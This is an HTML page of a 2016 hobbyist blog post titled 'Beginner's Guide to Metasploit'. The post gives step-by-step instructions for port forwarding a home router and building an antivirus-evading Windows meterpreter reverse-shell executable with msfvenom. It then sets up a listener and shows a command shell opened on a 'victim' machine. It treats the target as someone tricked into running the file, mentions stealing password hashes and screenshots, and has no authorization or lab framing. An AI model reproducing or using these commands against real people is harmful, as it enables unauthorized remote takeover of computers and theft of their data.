<!DOCTYPE html>
<html lang="en">

<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Personal site and blog for the teaching and spreading of hacktivism and programming and everything technical">

    <title>Beginner's Guide to Metasploit - ./codemuch?</title>

    <link rel="canonical" href="http://ex0dus-0x.github.io/2016/03/27/beginners-guide-to-metasploit/">

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="/css/bootstrap.min.css">

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/clean-blog.css">

    <!-- Pygments Github CSS -->
    <link rel="stylesheet" href="/css/syntax.css">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.3.0/css/font-awesome.min.css" rel="stylesheet" type="text/css">
    <link href='//fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic' rel='stylesheet' type='text/css'>
    <link href='//fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800' rel='stylesheet' type='text/css'>

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="https://oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <link type="application/atom+xml" rel="alternate" href="http://ex0dus-0x.github.io/feed.xml" title="./codemuch?" />

</head>


<head>
<link rel="alternate" type="application/rss+xml" title="My Site RSS" href="/feed.xml" />
</head>

<body>

    <!-- Navigation -->
<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
    <div class="container-fluid">
        <!-- Brand and toggle get grouped for better mobile display -->
        <div class="navbar-header page-scroll">
            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                <span class="sr-only">Toggle navigation</span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
                <span class="icon-bar"></span>
            </button>
            <a class="navbar-brand" href="/">./codemuch?</a>
        </div>

        <!-- Collect the nav links, forms, and other content for toggling -->
        <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
            <ul class="nav navbar-nav navbar-right">
                <li>
                    <a href="/">Home</a>
                </li>
                
				
                <li>
                    <a href="/about/">About</a>
                </li>
				
                
				
                <li>
                    <a href="/contact/">Contact</a>
                </li>
				
                
				
                <li>
                    <a href="/documents/">Documentation</a>
                </li>
				
                
				
                <li>
                    <a href="/projects/">Projects</a>
                </li>
				
                
				
                <li>
                    <a href="/texts/">Suggested Readings</a>
                </li>
				
                
            </ul>
        </div>
        <!-- /.navbar-collapse -->
    </div>
    <!-- /.container -->
</nav>


    <!-- Post Header -->
<header class="intro-header" style="background-image: url('/img/PostBG/post-bg-06.png')">
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <div class="post-heading">
                    <h1>Beginner's Guide to Metasploit</h1>
                    
                    <h2 class="subheading">Super l33t h4x0r time!</h2>
                    
                    <span class="meta">Posted by ex0dus on March 27, 2016</span>
                </div>
            </div>
        </div>
    </div>
</header>

<!-- Post Content -->
<article>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">

				<p>Due to popular request, I’m going to teach Metasploit.</p>

<p><strong>Metasploit</strong> is a pen testing framework suite written in the Ruby programming language. People use Metasploit to commonly gain access to a computer, through exploits, which find flaws, whether in the system or software the victim has and allows you to gain access.</p>

<p>It is pretty complicated, so I will be covering some of the essentials in a simple tutorial. We will set up a basic so-called “virus”. Technically it’s a payload that acts as a backdoor, so that once the user executes it, you get ahold of their computer.</p>

<p>This tutorial will mostly base around the premise that your target is outside your network, so there is going to be a little configuration.</p>

<h2 id="installing">Installing</h2>

<p>If you are on Kali Linux, which is recommended, metasploit is automatically installed, as I have said before. Simply type <strong>“msfconsole”</strong> to get started. I recommend using the Linux version. The Windows version is pretty limited and is kind of shit. If you are on Ubuntu like me, and want to install it, good luck. This was probably one of the hardest things I’ve ever done. You might as well use Kali on VM if you can’t install it. But if you are hardcore, click <a href="http://www.darkoperator.com/installing-metasploit-in-ubunt/"><strong>Here</strong></a></p>

<h2 id="getting-started">Getting Started</h2>

<p>1. Type “ifconfig” in your terminal. Obtain your inet address, most likely in wlan0 or eth0 (it should be 192.168.x.x for most). This is your computers given address on your network. <img src="/img/BeginnersGuideToMetasploit/ifconfig.png" alt="" /> 2. Open your router settings. This is achieved by typing 192.168.1.1 in your browser (search it up if it isn’t it. Every router brand is different. I use a Verizon router). <img src="/img/BeginnersGuideToMetasploit/verizonlogin.png" alt="" /> 3. Find out where port forwarding is. There may be a tab called “Firewall” you might have to click. Again, all router brands are different in terms of settings and configuration, so you might have to go on the Internet and search it up. For my Verizon router, there is a tab called “Firewall”. After clicking on it, I get routed to another page, where this a tab on the side called “Port Forwarding”. <img src="/img/BeginnersGuideToMetasploit/firewallportfor.png" alt="" /> 4. Enter the IP address you had previously, the one for your computer. Port forward port “4444”. What will happen is, when you receive a request for a connection to your public IP address through port 4444, it will be rerouted to your local IP. It’s kind of like a map. Port forwarding is me building a shortcut. 5. In your terminal, we will make our payload. Type:</p>

<pre><code>msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 -b ‘\x00′ LHOST=[your PUBLIC IP] LPORT=4444 -f exe &gt; payload.exe
</code></pre>

<p>Let’s break this down. <strong>MSFvenom</strong> is the payload creation script (it was originally msfpayload). <strong>–P</strong> is the parameter to pass that signifies what kind of payload we are creating. In this case, we are creating a <strong>windows/meterpreter/reverse_tcp</strong> one. This kind of payload will create a shell called Meterpreter, which is like the Command Line, but for hackers. I’ll get to it later. <strong>–E x86/shikata_ga_nai</strong> is the parameter for encoding the payload using shikata_ga_nai, where we mask it so that the victim’s anti-virus won’t detect the payload, since it is technically, a virus. Encoding a payload using MSFvenom isn’t really effective anymore, but it is for the sake of demonstration. Don’t worry, there are ways to mask payloads and bypass AV. I will talk about it later. <strong>–I 5</strong> means we encode it 5 times. <strong>–B ‘x/00’</strong> has something to do with shellcode, and we won’t really get into it. Now however the next part, LHOST and LPORT is important. You will enter your public IP address in LHOST. Public, not the 192.168.x.x one. Your LPORT will be 4444. This means that once the victim opens the payload, a connection will be sent to your public IP, and it will forwarded to your local IP (the 192.168.x.x one), where a listener will be set up (we will do this in the next 2 steps). 6. After you press enter, the payload will generate. Open another terminal and type “msfconsole”. You will see an interpreter-style-thingy like this: <img src="/img/BeginnersGuideToMetasploit/msfcli.png" alt="" /> 7. After your payload is generated, it should be in your /root/ directory. Leave it where it is for now. In your terminal with Metasploit open, type</p>

<pre><code>msf &gt; use exploit/multi/handler
</code></pre>

<p>8. This is the handler that will be set up to handle the incoming request from the victim’s computer. Now type in:</p>

<pre><code>msf exploit(handler) &gt; set LHOST=[your LOCAL IP here]
</code></pre>

<p>9. We will establish a listener that will listen for the request. It will be hosted on your computer, hence the LOCAL IP.</p>

<pre>**msf exploit(handler) &gt;**set LPORT=4444</pre>

<p>10. This establishes the port. Now type:</p>

<pre>**msf exploit(handler) &gt;**show options</pre>

<p>11. Everything should be set and in place. Now type run:</p>

<pre><code>msf exploit(handler) &gt;run
12\. You will see something like:
[*]Started reverse handler on 192.168.x.x:4444
[*]Starting the payload handler…
</code></pre>

<p>13. You have set up your handler and listener! Now in order to get a Meterpreter shell, a victim needs to open your payload. Doing so, a connection will be sent back, and your listener will intercept the connection and the handler will start a meterpreter session, which looks like:</p>

<pre>**meterpreter&gt;**</pre>

<p>14. Congrats! You learnt the basics of Metasploit. Now you may ask, what to do with meterpreter? Well, here’s an example:</p>

<pre><code>meterpreter&gt; shell
Process 2314 created
Channel 1 created
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation. All rights reserved.
C:\Windows\System32&gt;
</code></pre>

<p>This establishes a Windows Command Prompt shell and now you have access over the victim’s computer! You can do much more with Meterpreter. You can take a screeshot of the victim’s computer, see system processes, steal hash, etc. Here’s a list: <a href="http://null-byte.wonderhowto.com/how-to/hack-like-pro-ultimate-command-cheat-sheet-for-metasploits-meterpreter-0149146/"><strong>Null Byte</strong></a></p>

<p>Well that is all. This article was probably a little dull, but I will soon elaborate on this tutorial. I will talk about exploitation through obfuscating payloads in PDF files, text documents, videos, etc. I will also talk about bypassing AV (anti-virus), since many modern day AVs detect these Metasploit payloads as viruses and backdoors.</p>

<h2 id="i-have-set-up-a-contact-form-in-the-contact-section-of-this-site-please-do-not-hesistate-to-use-it-if-you-have-any-inquiries">I have set up a Contact Form in the <strong>Contact</strong> section of this site! Please do not hesistate to use it if you have any inquiries</h2>


                <hr>

                
                    <div id="disqus_thread"></div>
                    <script>
    /**
     *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
     *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
     */
    /*
    var disqus_config = function () {
        this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
        this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
    };
    */              // var disqus_developer = 1; //when developing, uncomment.
                    (function() {  // DON'T EDIT BELOW THIS LINE
                        var d = document, s = d.createElement('script');
        
                        s.src = '//codemuch.disqus.com/embed.js';
        
                     s.setAttribute('data-timestamp', +new Date());
                        (d.head || d.body).appendChild(s);
                    })();
                </script>
                <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a></noscript>

                


              
                <ul class="pager">
                    
                    <li class="previous">
                        <a href="/2016/03/27/updates-mar-27-2016/" data-toggle="tooltip" data-placement="top" title="UPDATES: March 27th, 2016">&larr; Previous Post</a>
                    </li>
                    
                    
                    <li class="next">
                        <a href="/2016/04/16/arduino-wtf-is-it/" data-toggle="tooltip" data-placement="top" title="Arduino - WTF is it?">Next Post &rarr;</a>
                    </li>
                    
                </ul>

            </div>
        </div>
    </div>
</article>

<hr>


    <!-- Footer -->
<footer>
    <div class="container">
        <div class="row">
            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
                <ul class="list-inline text-center">
                    <li>
                        <a href="/feed.xml">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-rss fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    <li>
                        <a href="https://twitter.com/ex0dus_0x">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-twitter fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    <li>
                        <a href="https://github.com/ex0dus-0x">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-github fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    <li>
                        <a href="mailto:stack.over.heap@gmail.com">
                            <span class="fa-stack fa-lg">
                                <i class="fa fa-circle fa-stack-2x"></i>
                                <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
                            </span>
                        </a>
                    </li>
                    
                </ul>
                <p class="copyright text-muted">Copyright &copy; CodeMuch 2016</p>
            </div>
        </div>
    </div>
</footer>

<!-- jQuery -->
<script src="/js/jquery.min.js "></script>

<!-- Bootstrap Core JavaScript -->
<script src="/js/bootstrap.min.js "></script>

<!-- Custom Theme JavaScript -->
<script src="/js/clean-blog.min.js "></script>


</body>

</html>
